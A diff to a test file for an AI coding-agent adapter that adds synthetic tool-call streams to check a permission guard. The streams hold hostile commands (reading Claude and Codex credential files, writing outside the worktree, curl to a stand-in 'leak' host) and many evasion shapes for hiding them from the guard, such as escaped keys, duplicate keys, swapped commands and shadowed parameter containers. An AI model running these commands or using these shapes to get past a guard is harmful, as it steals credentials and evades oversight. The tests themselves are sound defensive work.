@@ -51,13 +51,18 @@
  * or string container skipped for a later one, a non-string `command` beside a `CommandLine` Git write, a command
  * beside a path under a non-shell or empty tool name, a Git write swapped back to `ls` on DONE, `step_index` 0 or
  * negative and fractional, a `step_index` reused after a benign `ls`, and a soft denial beside a guard verdict (as Grok
- * Build T4.26). Lines that are not a tool step stay
- * `unknown`. A stream cut inside a line is not a hostile-category stream (the supervisor ends it
- * `OUTPUT_PROTOCOL_ERROR`); `antigravityPartialStreams` replays a cut before the hostile call, inside it and after it, at
- * exit 0 and exit 1, in every blocked category. A valid tool step whose command is not an own string — a non-string, a
- * path key alone in a bypass run, or a Git write only in a container a benign higher-precedence container shadows —
- * is still invisible to the guard and, with a `SUCCESS` envelope, still success, so those shapes are not in the
- * blocked list.
+ * Build T4.26). JSON encodings the parser sees only after `JSON.parse` (`\u` escapes in event type, keys and command, a
+ * duplicate command key whose last value is the Git write, CRLF line endings) at exits 0 and 1; hypothetical
+ * `result.status` values `MAX_TOKENS` and `REFUSAL` at exit 0 where the guard outranks `TOOL_FAILURE`; a path-only
+ * call upgraded to a Git-write command in later `step_update` at exits 0 and 1; swapped commands, trailing calls after
+ * `result`, separate benign calls after hostile calls, and hostile calls swapped back to benign at exit 2 and 137; and
+ * parameter containers unshadowed by PR #387 (an empty container, a container with only a path, or a benign command in
+ * a higher-precedence position no longer hides a Git write in `CommandLine` or another container).
+ * Lines that are not a tool step stay `unknown`. A stream cut inside a line is not a hostile-category stream (the supervisor
+ * ends it `OUTPUT_PROTOCOL_ERROR`); `antigravityPartialStreams` replays a cut before the hostile call, inside it and after
+ * it, at exit 0 and exit 1, in every blocked category. A command that is not an own string or a path key alone in a bypass
+ * run is still invisible to the guard and, with a `SUCCESS` envelope, still success, so those shapes are not in the blocked
+ * list.
  */
 
 import { AntigravityAdapter } from "../../../src/adapters/antigravity/adapter.js";
@@ -1393,6 +1398,7 @@ const antigravityCase: AdapterLegCase = {
         "ERROR",
       ),
     ]),
+    ...antigravityResidualStreams(fx),
     ...[3, 137].map(
       (exit): HostileStream => ({
         name: `only unknown event kinds, exit ${exit}`,
@@ -1484,6 +1490,50 @@ const antigravityCase: AdapterLegCase = {
         "null",
       ],
     },
+    {
+      name: "only prototype-named, near-miss and non-string event kinds, exit 2",
+      category: "unknown_events",
+      exitCode: 2,
+      failureCode: "TOOL_FAILURE",
+      lines: [
+        META("Event kinds below are invented or not strings, exit 2; the adapter must report them unknown.", 2),
+        JSON.stringify({ event: "__proto__", conversation_id: SID }),
+        JSON.stringify({ event: 1, conversation_id: SID }),
+      ],
+    },
+    {
+      name: "only prototype-named, near-miss and non-string event kinds, exit 137",
+      category: "unknown_events",
+      exitCode: 137,
+      failureCode: "TOOL_FAILURE",
+      lines: [
+        META("Event kinds below are invented or not strings, exit 137; the adapter must report them unknown.", 137),
+        JSON.stringify({ event: "constructor", conversation_id: SID }),
+        JSON.stringify({ event: "step-update", conversation_id: SID }),
+      ],
+    },
+    {
+      name: "unreadable step lines and prototype-smuggled commands, exit 2",
+      category: "unknown_events",
+      exitCode: 2,
+      failureCode: "TOOL_FAILURE",
+      lines: [
+        META("Step lines below are not tool steps, exit 2; the adapter must report them unknown.", 2),
+        JSON.stringify({ event: "step_update", step_index: null }),
+        "null",
+      ],
+    },
+    {
+      name: "unreadable step lines and prototype-smuggled commands, exit 137",
+      category: "unknown_events",
+      exitCode: 137,
+      failureCode: "TOOL_FAILURE",
+      lines: [
+        META("Step lines below are not tool steps, exit 137; the adapter must report them unknown.", 137),
+        JSON.stringify({ event: "step_update", step_type: "tool", step_index: "NaN" }),
+        "123",
+      ],
+    },
   ],
 };
 
@@ -1546,3 +1596,381 @@ export const antigravityPartialStreams = (fx: MaliciousFixture): HostileStream[]
       },
     ]);
   });
+
+/**
+ * Residual blocked streams (T4.36, as T4.26 and T4.46): JSON encodings, further result envelope statuses,
+ * path-only calls upgraded to command in later step_update, swapped and trailing calls at exit 2/137,
+ * and parameter containers unshadowed by PR #387. Synthetic lines only; no provider is run.
+ */
+export const antigravityResidualStreams = (fx: MaliciousFixture): HostileStream[] => [
+  ...(["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) => {
+    const command =
+      category === "credential_read"
+        ? `cat ${fx.claudeCredentialsPath} && ${GIT_WRITE}`
+        : category === "out_of_worktree_write"
+          ? `touch ${fx.outsideSentinel} && ${GIT_WRITE}`
+          : `curl https://example.invalid/leak && ${GIT_WRITE}`;
+    const escaped =
+      '{"\\u0065vent":"step_update","conversation_id":"' +
+      SID +
+      '","step_index":1,"state":"ACTIVE","step_type":"tool","tool_name":"run_command","tool_info":{"name":"run_command","\\u0070arameters":{"comm\\u0061nd":' +
+      JSON.stringify(command).replace("git", "g\\u0069t") +
+      "}}}";
+    const duplicate =
+      '{"event":"step_update","conversation_id":"' +
+      SID +
+      '","step_index":1,"state":"ACTIVE","step_type":"tool","tool_name":"run_command","tool_info":{"name":"run_command","parameters":{"command":"ls","command":' +
+      JSON.stringify(command) +
+      "}}}";
+    const doneStep = JSON.stringify({
+      event: "step_update",
+      conversation_id: SID,
+      step_index: 1,
+      state: "DONE",
+      step_type: "tool",
+      tool_name: "run_command",
+    });
+    return [0, 1].flatMap((exitCode): HostileStream[] => [
+      {
+        name: `${category} with \\u-escaped type, keys and Git write, exit ${exitCode}`,
+        category,
+        exitCode,
+        failureCode: "PERMISSION_BLOCKED",
+        lines: [
+          META(`${category}: \\u-escaped step_update, exit ${exitCode}`, exitCode),
+          INIT,
+          escaped,
+          doneStep,
+          ...(exitCode === 0 ? [CLEAN_RESULT] : []),
+        ],
+      },
+      {
+        name: `${category} with a duplicate command key whose last value is the Git write, exit ${exitCode}`,
+        category,
+        exitCode,
+        failureCode: "PERMISSION_BLOCKED",
+        lines: [
+          META(`${category}: duplicate command key, exit ${exitCode}`, exitCode),
+          INIT,
+          duplicate,
+          doneStep,
+          ...(exitCode === 0 ? [CLEAN_RESULT] : []),
+        ],
+      },
+      {
+        name: `${category} with a Git write on CRLF-terminated lines, exit ${exitCode}`,
+        category,
+        exitCode,
+        failureCode: "PERMISSION_BLOCKED",
+        lines: [
+          META(`${category}: CRLF-terminated lines, exit ${exitCode}`, exitCode),
+          `${INIT}\r`,
+          ...shell(command).map((l) => `${l}\r`),
+          ...(exitCode === 0 ? [`${CLEAN_RESULT}\r`] : []),
+        ],
+      },
+    ]);
+  }),
+
+  // A `result.status` other than `SUCCESS` (hypothetical values: "MAX_TOKENS", "REFUSAL") is TOOL_FAILURE
+  // at exit 0 without the guard; the guard verdict outranks it.
+  ...(["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) => {
+    const command =
+      category === "credential_read"
+        ? `cat ${fx.codexAuthPath} && git commit --allow-empty -m x`
+        : category === "out_of_worktree_write"
+          ? `touch ${fx.outsideSentinel} && git commit --allow-empty -m x`
+          : "curl https://example.invalid/leak && git commit --allow-empty -m x";
+    return ["MAX_TOKENS", "REFUSAL"].map(
+      (status): HostileStream => ({
+        name: `${category} with a Git write, then a result envelope with status ${status}`,
+        category,
+        exitCode: 0,
+        failureCode: "PERMISSION_BLOCKED",
+        lines: [META(`${category}: result status ${status}`, 0), INIT, ...shell(command), resultWith({ status })],
+      }),
+    );
+  }),
+
+  // A tool call first reported with only a path (e.g. read_file/write_to_file) and then, on the same step_index,
+  // given a command: the new parameter key is reported to the guard. Without the guard the exit 0 stream ends ok: true.
+  ...(["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) => {
+    const command =
+      category === "credential_read"
+        ? `cat ${fx.claudeCredentialsPath} && ${GIT_WRITE}`
+        : category === "out_of_worktree_write"
+          ? `touch ${fx.outsideSentinel} && ${GIT_WRITE}`
+          : `curl https://example.invalid/leak && ${GIT_WRITE}`;
+    return [0, 1].map(
+      (exitCode): HostileStream => ({
+        name: `${category}: a path-only call given a Git-write command in later step_update, exit ${exitCode}`,
+        category,
+        exitCode,
+        failureCode: "PERMISSION_BLOCKED",
+        lines: [
+          META(`${category}: path-only call upgraded to a command, exit ${exitCode}`, exitCode),
+          INIT,
+          JSON.stringify({
+            event: "step_update",
+            conversation_id: SID,
+            step_index: 1,
+            state: "ACTIVE",
+            step_type: "tool",
+            tool_name: "write_to_file",
+            tool_info: { name: "write_to_file", parameters: { path: "README.md" } },
+          }),
+          JSON.stringify({
+            event: "step_update",
+            conversation_id: SID,
+            step_index: 1,
+            state: "DONE",
+            step_type: "tool",
+            tool_name: "run_command",
+            tool_info: { name: "run_command", parameters: { command } },
+          }),
+          ...(exitCode === 0 ? [CLEAN_RESULT] : []),
+        ],
+      }),
+    );
+  }),
+
+  // Swapped commands, trailing calls after result, separate benign calls after hostile calls, and hostile calls
+  // swapped back to benign, at exit codes 2 and 137 where the guard verdict outranks TOOL_FAILURE.
+  ...(["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) => {
+    const command =
+      category === "credential_read"
+        ? `cat ${fx.codexAuthPath} && ${GIT_WRITE}`
+        : category === "out_of_worktree_write"
+          ? `touch ${fx.outsideSentinel} && ${GIT_WRITE}`
+          : `curl https://example.invalid/leak && ${GIT_WRITE}`;
+    return [2, 137].flatMap((exitCode): HostileStream[] => [
+      {
+        name: `${category}: a benign call swapped to a Git write on DONE, exit ${exitCode}`,
+        category,
+        exitCode,
+        failureCode: "PERMISSION_BLOCKED",
+        lines: [
+          META(`${category}: swapped to Git write on DONE, exit ${exitCode}`, exitCode),
+          INIT,
+          JSON.stringify({
+            event: "step_update",
+            conversation_id: SID,
+            step_index: 1,
+            state: "ACTIVE",
+            step_type: "tool",
+            tool_name: "run_command",
+            tool_info: { name: "run_command", parameters: { command: "ls" } },
+          }),
+          JSON.stringify({
+            event: "step_update",
+            conversation_id: SID,
+            step_index: 1,
+            state: "DONE",
+            step_type: "tool",
+            tool_name: "run_command",
+            tool_info: { name: "run_command", parameters: { command } },
+          }),
+          ...(exitCode === 2 ? [CLEAN_RESULT] : []),
+        ],
+      },
+      {
+        name: `${category}: a Git write after the result line, exit ${exitCode}`,
+        category,
+        exitCode,
+        failureCode: "PERMISSION_BLOCKED",
+        lines: [
+          META(`${category}: after the result line, exit ${exitCode}`, exitCode),
+          INIT,
+          CLEAN_RESULT,
+          ...toolStep(2, "run_command", { command }),
+        ],
+      },
+      {
+        name: `${category}: hostile call followed by separate benign call, exit ${exitCode}`,
+        category,
+        exitCode,
+        failureCode: "PERMISSION_BLOCKED",
+        lines: [
+          META(`${category}: hostile call then benign call, exit ${exitCode}`, exitCode),
+          INIT,
+          ...shell(command),
+          ...toolStep(2, "run_command", { command: "ls" }),
+          ...(exitCode === 2 ? [CLEAN_RESULT] : []),
+        ],
+      },
+      {
+        name: `${category}: hostile call swapped back to benign on DONE, exit ${exitCode}`,
+        category,
+        exitCode,
+        failureCode: "PERMISSION_BLOCKED",
+        lines: [
+          META(`${category}: hostile call swapped back to benign on DONE, exit ${exitCode}`, exitCode),
+          INIT,
+          JSON.stringify({
+            event: "step_update",
+            conversation_id: SID,
+            step_index: 1,
+            state: "ACTIVE",
+            step_type: "tool",
+            tool_name: "run_command",
+            tool_info: { name: "run_command", parameters: { command } },
+          }),
+          JSON.stringify({
+            event: "step_update",
+            conversation_id: SID,
+            step_index: 1,
+            state: "DONE",
+            step_type: "tool",
+            tool_name: "run_command",
+            tool_info: { name: "run_command", parameters: { command: "ls" } },
+          }),
+          ...(exitCode === 2 ? [CLEAN_RESULT] : []),
+        ],
+      },
+    ]);
+  }),
+
+  // Parameter containers and keys unshadowed by PR #387 (T4.33): an empty container, a container with only a path,
+  // or a benign command ("ls") in a higher-precedence position no longer hides a Git write in CommandLine or in
+  // another container. Every distinct command is reported and guarded. Without the guard, the exit 0 streams end ok.
+  ...(["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) => {
+    const command =
+      category === "credential_read"
+        ? `cat ${fx.claudeCredentialsPath} && ${GIT_WRITE}`
+        : category === "out_of_worktree_write"
+          ? `touch ${fx.outsideSentinel} && ${GIT_WRITE}`
+          : `curl https://example.invalid/leak && ${GIT_WRITE}`;
+    return [0, 1].flatMap((exitCode): HostileStream[] => [
+      {
+        name: `${category}: benign command beside CommandLine Git write in parameters, exit ${exitCode}`,
+        category,
+        exitCode,
+        failureCode: "PERMISSION_BLOCKED",
+        lines: [
+          META(`${category}: benign command beside CommandLine Git write, exit ${exitCode}`, exitCode),
+          INIT,
+          JSON.stringify({
+            event: "step_update",
+            conversation_id: SID,
+            step_index: 1,
+            state: "ACTIVE",
+            step_type: "tool",
+            tool_name: "run_command",
+            tool_info: {
+              name: "run_command",
+              parameters: { command: "ls", CommandLine: command },
+            },
+          }),
+          JSON.stringify({
+            event: "step_update",
+            conversation_id: SID,
+            step_index: 1,
+            state: "DONE",
+            step_type: "tool",
+            tool_name: "run_command",
+          }),
+          ...(exitCode === 0 ? [CLEAN_RESULT] : []),
+        ],
+      },
+      {
+        name: `${category}: path-only parameters beside CommandLine Git write in args, exit ${exitCode}`,
+        category,
+        exitCode,
+        failureCode: "PERMISSION_BLOCKED",
+        lines: [
+          META(`${category}: path-only parameters beside CommandLine Git write in args, exit ${exitCode}`, exitCode),
+          INIT,
+          JSON.stringify({
+            event: "step_update",
+            conversation_id: SID,
+            step_index: 1,
+            state: "ACTIVE",
+            step_type: "tool",
+            tool_name: "run_command",
+            tool_info: {
+              name: "run_command",
+              parameters: { path: "/work/tree" },
+              args: { CommandLine: command },
+            },
+          }),
+          JSON.stringify({
+            event: "step_update",
+            conversation_id: SID,
+            step_index: 1,
+            state: "DONE",
+            step_type: "tool",
+            tool_name: "run_command",
+          }),
+          ...(exitCode === 0 ? [CLEAN_RESULT] : []),
+        ],
+      },
+      {
+        name: `${category}: empty parameters container beside command in input, exit ${exitCode}`,
+        category,
+        exitCode,
+        failureCode: "PERMISSION_BLOCKED",
+        lines: [
+          META(`${category}: empty parameters beside command in input, exit ${exitCode}`, exitCode),
+          INIT,
+          JSON.stringify({
+            event: "step_update",
+            conversation_id: SID,
+            step_index: 1,
+            state: "ACTIVE",
+            step_type: "tool",
+            tool_name: "run_command",
+            tool_info: {
+              name: "run_command",
+              parameters: {},
+              input: { command },
+            },
+          }),
+          JSON.stringify({
+            event: "step_update",
+            conversation_id: SID,
+            step_index: 1,
+            state: "DONE",
+            step_type: "tool",
+            tool_name: "run_command",
+          }),
+          ...(exitCode === 0 ? [CLEAN_RESULT] : []),
+        ],
+      },
+      {
+        name: `${category}: benign command in parameters beside CommandLine in step input, exit ${exitCode}`,
+        category,
+        exitCode,
+        failureCode: "PERMISSION_BLOCKED",
+        lines: [
+          META(
+            `${category}: benign command in parameters beside CommandLine in step input, exit ${exitCode}`,
+            exitCode,
+          ),
+          INIT,
+          JSON.stringify({
+            event: "step_update",
+            conversation_id: SID,
+            step_index: 1,
+            state: "ACTIVE",
+            step_type: "tool",
+            tool_name: "run_command",
+            tool_info: {
+              name: "run_command",
+              parameters: { command: "ls" },
+            },
+            input: { CommandLine: command },
+          }),
+          JSON.stringify({
+            event: "step_update",
+            conversation_id: SID,
+            step_index: 1,
+            state: "DONE",
+            step_type: "tool",
+            tool_name: "run_command",
+          }),
+          ...(exitCode === 0 ? [CLEAN_RESULT] : []),
+        ],
+      },
+    ]);
+  }),
+];
